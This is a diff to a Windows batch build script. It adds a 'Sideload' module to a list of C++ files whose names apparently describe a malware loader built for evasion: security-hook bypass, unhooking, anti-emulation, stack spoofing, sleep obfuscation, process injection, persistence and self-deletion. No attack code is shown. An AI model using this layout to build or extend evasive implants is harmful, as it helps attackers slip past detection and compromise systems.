@@ -62,7 +62,7 @@ echo [BUILD]   StackSpoof.asm -> OK
 echo.
 echo [BUILD] === Compiling C++ files ===
 
-set CPPFILES=ApiResolver Crypto KeyDerive PureCrypto NeuroDecrypt GhostDecrypt DarknetDecrypt VoidDecrypt Telemetry PatchlessBypass KnownDlls Syscall GadgetPool Hotpatch VehDispatcher Unhook AntiEmul Phantom ThreadPool GuardPage StackSpoof TlsCallback AntiCheck GodMode Persist Melt Motw Injection DotNetLoader ThreadNormalizer SleepObf AntiMemScan StageLoader CrtStubs
+set CPPFILES=ApiResolver Crypto KeyDerive PureCrypto NeuroDecrypt GhostDecrypt DarknetDecrypt VoidDecrypt Telemetry PatchlessBypass KnownDlls Syscall GadgetPool Hotpatch VehDispatcher Unhook AntiEmul Phantom ThreadPool GuardPage StackSpoof TlsCallback AntiCheck GodMode Persist Melt Motw Injection DotNetLoader ThreadNormalizer SleepObf AntiMemScan StageLoader CrtStubs Sideload
 
 set COMPILE_ERRORS=0
 for %%F in (%CPPFILES%) do (
